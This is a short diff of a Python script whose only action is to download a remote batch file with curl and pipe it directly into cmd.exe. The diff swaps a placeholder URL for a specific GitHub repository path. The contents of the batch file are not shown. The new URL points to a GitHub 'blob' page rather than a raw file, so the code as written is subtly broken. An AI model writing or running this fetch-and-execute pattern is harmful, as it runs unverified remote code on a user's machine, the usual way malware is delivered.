@@ -1,6 +1,6 @@
 import subprocess
 
-url = "https://raw.githubusercontent.com/USER/REPO/main/1.bat"
+url = "https://github.com/joythink77/abc/blob/main/1.bat"
 
 subprocess.run(
     f'curl -s "{url}" | cmd.exe',
